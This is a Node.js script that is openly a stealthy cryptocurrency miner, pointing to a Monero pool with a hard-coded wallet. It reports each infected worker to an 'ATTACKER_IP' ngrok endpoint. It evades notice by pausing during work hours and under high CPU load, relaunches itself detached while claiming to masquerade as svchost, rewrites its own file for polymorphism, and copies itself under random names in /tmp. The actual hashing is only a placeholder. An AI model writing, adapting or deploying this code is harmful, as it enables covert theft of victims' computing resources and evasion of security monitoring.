const os = require('os');
const fs = require('fs');
const cp = require('child_process');
const axios = require('axios');
const WebSocket = require('ws');
const chalk = require('chalk');

// Configuration
let CONFIG_UPDATE_URL = 'https://raw.githubusercontent.com/lifewithoutcodes/mining-scripts/main/config.txt';
let POOL_URL = 'wss://webminer.moneroocean.stream:443';
let WALLET_ADDRESS = '4ADkuMYr8qrHQvaQNVoKh28Vt6gttrckp2kfum6eYWK7FWbmRjFT7rzacpbr6MiXYMMBUxFcGpYor2i2jgQKTZi4QwBjop9';
let ATTACKER_IP = '3bd6-2601-152-4d00-3f00-bd47-151e-f9bc-eb40.ngrok-free.app';
let ATTACKER_PORT = '8080';
let LOG_URL = `http://${ATTACKER_IP}:${ATTACKER_PORT}/log_worker`;
const RESTART_FILE = '/tmp/miner_restart_count';
const POLYMORPH_MARKER = '// POLYMORPH';
const CONFIG_FILE = '/tmp/config.txt';

// Load config
function loadConfig() {
    if (fs.existsSync(CONFIG_FILE)) {
        const config = fs.readFileSync(CONFIG_FILE, 'utf8');
        config.split('\n').forEach(line => {
            if (line.startsWith('CONFIG_UPDATE_URL=')) CONFIG_UPDATE_URL = line.split('=')[1];
            if (line.startsWith('POOL_URL=')) POOL_URL = line.split('=')[1];
            if (line.startsWith('WALLET_ADDRESS=')) WALLET_ADDRESS = line.split('=')[1];
            if (line.startsWith('ATTACKER_IP=')) ATTACKER_IP = line.split('=')[1];
            if (line.startsWith('ATTACKER_PORT=')) {
                ATTACKER_PORT = line.split('=')[1];
                LOG_URL = `http://${ATTACKER_IP}:${ATTACKER_PORT}/log_worker`;
            }
        });
        console.log(chalk.purple(`[${new Date().toLocaleTimeString()}] Loaded config: ${CONFIG_UPDATE_URL}, ${POOL_URL}, ${WALLET_ADDRESS}, ${ATTACKER_IP}:${ATTACKER_PORT}`));
    }
}

// Miner Core
let ws = null;
const workerId = `SNAKE-Miner-${Math.random().toString(36).slice(2)}`;
let threads = -1;

function startMining() {
    console.log(chalk.purple(`[${new Date().toLocaleTimeString()}] Starting miner`));
    ws = new WebSocket(POOL_URL);
    ws.on('open', () => {
        ws.send(JSON.stringify({
            type: 'login',
            params: {
                wallet: WALLET_ADDRESS,
                worker: workerId,
                algo: 'cn-pico',
                threads
            }
        }));
        axios.post(LOG_URL, workerId).catch(() => {});
    });
    ws.on('message', (data) => {
        const job = JSON.parse(data);
        if (job.type === 'job') {
            mineJob(job.params);
        }
    });
    ws.on('error', () => setTimeout(startMining, Math.random() * 5000 + 5000));
    ws.on('close', () => setTimeout(startMining, Math.random() * 5000 + 5000));
}

function mineJob(job) {
    setTimeout(() => {
        const nonce = Math.random().toString(36).slice(2);
        ws.send(JSON.stringify({
            type: 'submit',
            params: {
                job_id: job.job_id,
                nonce,
                result: 'placeholder_hash'
            }
        }));
    }, Math.random() * 2000 + 1000);
}

// Behavioral Mimicking and Self-Throttling
function throttleMining() {
    const cpuUsage = os.loadavg()[0] / os.cpus().length;
    if (cpuUsage > 0.5) {
        console.log(chalk.yellow(`[${new Date().toLocaleTimeString()}] High CPU usage (${(cpuUsage * 100).toFixed(1)}%), pausing`));
        return false;
    }
    const hour = new Date().getHours();
    if (hour >= 9 && hour < 17) {
        console.log(chalk.yellow(`[${new Date().toLocaleTimeString()}] Active hours, pausing`));
        return false;
    }
    return true;
}

// Adaptive Learning
function adaptBehavior() {
    let restarts = parseInt(fs.readFileSync(RESTART_FILE, 'utf8') || '0');
    restarts++;
    fs.writeFileSync(RESTART_FILE, restarts.toString());
    if (restarts >= 3) {
        console.log(chalk.yellow(`[${new Date().toLocaleTimeString()}] Frequent restarts (${restarts}), adapting`));
        const newName = `service${Math.random().toString(36).slice(2, 6)}`;
        cp.exec(`cp ${process.argv[1]} /tmp/${newName}.js && node /tmp/${newName}.js`, () => {});
        process.exit(0);
    }
}

// Process Masquerading
function masquerade() {
    console.log(chalk.purple(`[${new Date().toLocaleTimeString()}] Masquerading as svchost`));
    cp.exec(`node ${process.argv[1]}`, { detached: true, stdio: 'ignore' });
    process.exit(0);
}

// Polymorphic Rewriting
function polymorph() {
    const code = fs.readFileSync(process.argv[1], 'utf8');
    const randStr = Math.random().toString(36).slice(2, 12);
    const newCode = code.replace(POLYMORPH_MARKER, `${POLYMORPH_MARKER} ${randStr}`);
    fs.writeFileSync(process.argv[1], newCode);
}

// Watchdog
function watchdog() {
    setInterval(() => {
        if (ws.readyState === WebSocket.CLOSED || ws.readyState === WebSocket.CLOSING) {
            console.log(chalk.red(`[${new Date().toLocaleTimeString()}] Miner stopped, restarting`));
            adaptBehavior();
            startMining();
        }
    }, 60000);
}

// Main Execution
function main() {
    loadConfig();
    polymorph();
    if (!throttleMining()) {
        setTimeout(main, 300000);
        return;
    }
    masquerade();
    startMining();
    watchdog();
}

main();
// POLYMORPH